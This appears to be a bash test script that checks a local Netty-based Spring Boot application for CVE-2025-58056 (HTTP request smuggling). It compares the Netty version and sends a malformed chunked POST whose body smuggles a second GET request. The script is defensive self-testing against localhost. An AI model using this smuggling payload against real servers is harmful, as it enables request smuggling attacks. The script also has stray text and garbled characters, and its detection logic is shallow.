Did #!/bin/bash

# CVE-2025-58056 Test Script
# This script tests for HTTP request smuggling vulnerability in Netty

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}üîç Testing CVE-2025-58056 (Netty HTTP Request Smuggling)${NC}"
echo "=============================================================="

# Check if application is running
APP_URL="http://localhost:8080"
if ! curl -s "$APP_URL/actuator/health" > /dev/null 2>&1; then
    echo -e "${YELLOW}‚ö†Ô∏è  Application not running. Starting it first...${NC}"
    echo "Please start your Spring Boot application and run this script zzagain."
    exit 1
fi

echo -e "${GREEN}‚úÖ Application is running${NC}"

# Test 1: Check Netty version
echo -e "${BLUE}üìã Test 1: Checking Netty version${NC}"
NETTY_VERSION=$(mvn dependency:tree | grep "netty-codec-http" | head -1 | grep -o "4\.1\.[0-9]*\.Final")
echo "Current Netty version: $NETTY_VERSION"

if [[ "$NETTY_VERSION" == "4.1.124.Final" ]]; then
    echo -e "${RED}‚ùå VULNERABLE: Using Netty 4.1.124.Final${NC}"
    VULNERABLE=true
elif [[ "$NETTY_VERSION" == "4.1.125.Final" ]]; then
    echo -e "${GREEN}‚úÖ SECURE: Using Netty 4.1.125.Final${NC}"
    VULNERABLE=false
else
    echo -e "${YELLOW}‚ö†Ô∏è  Unknown Netty version: $NETTY_VERSION${NC}"
    VULNERABLE=false
fi

# Test 2: HTTP Request Smuggling Test
echo -e "${BLUE}üìã Test 2: HTTP Request Smuggling Test${NC}"

# Create a test payload that exploits the vulnerability
PAYLOAD=$(cat << 'EOF'
5
{"test": "data"}
0

GET /actuator/health HTTP/1.1
Host: localhost:8080

EOF
)

echo "Sending malformed chunked request..."
RESPONSE=$(curl -s -X POST "$APP_URL/api/test" \
  -H "Content-Type: application/json" \
  -H "Transfer-Encoding: chunked" \
  --data-binary "$PAYLOAD" \
  -w "%{http_code}" \
  -o /dev/null)

echo "Response code: $RESPONSE"

# Test 3: Check for request smuggling indicators
echo -e "${BLUE}üìã Test 3: Checking for request smuggling indicators${NC}"

# Send a normal request first
NORMAL_RESPONSE=$(curl -s -X GET "$APP_URL/actuator/health" | jq -r '.status' 2>/dev/null || echo "unknown")
echo "Normal health check response: $NORMAL_RESPONSE"

# Test 4: Verify chunked encoding handling
echo -e "${BLUE}üìã Test 4: Testing chunked encoding handling${NC}"

# Send a properly formatted chunked request
PROPER_CHUNKED=$(cat << 'EOF'
5
{"test": "data"}
0

EOF
)

echo "Sending properly formatted chunked request..."
PROPER_RESPONSE=$(curl -s -X POST "$APP_URL/api/test" \
  -H "Content-Type: application/json" \
  -H "Transfer-Encoding: chunked" \
  --data-binary "$PROPER_CHUNKED" \
  -w "%{http_code}" \
  -o /dev/null)

echo "Proper chunked response code: $PROPER_RESPONSE"

# Summary
echo ""
echo -e "${BLUE}üìä Test Summary${NC}"
echo "=================="

if [[ "$VULNERABLE" == "true" ]]; then
    echo -e "${RED}‚ùå VULNERABLE: CVE-2025-58056 detected${NC}"
    echo "   - Netty version: $NETTY_VERSION"
    echo "   - Recommendation: Update to Netty 4.1.125.Final"
else
    echo -e "${GREEN}‚úÖ SECURE: CVE-2025-58056 not detected${NC}"
    echo "   - Netty version: $NETTY_VERSION"
    echo "   - Status: Protected against HTTP request smuggling"
fi

echo ""
echo -e "${YELLOW}üí° Note: This test checks for the vulnerability but may not detect all exploitation scenarios.${NC}"
echo -e "${YELLOW}   For comprehensive testing, use specialized security tools like Burp Suite.${NC}"
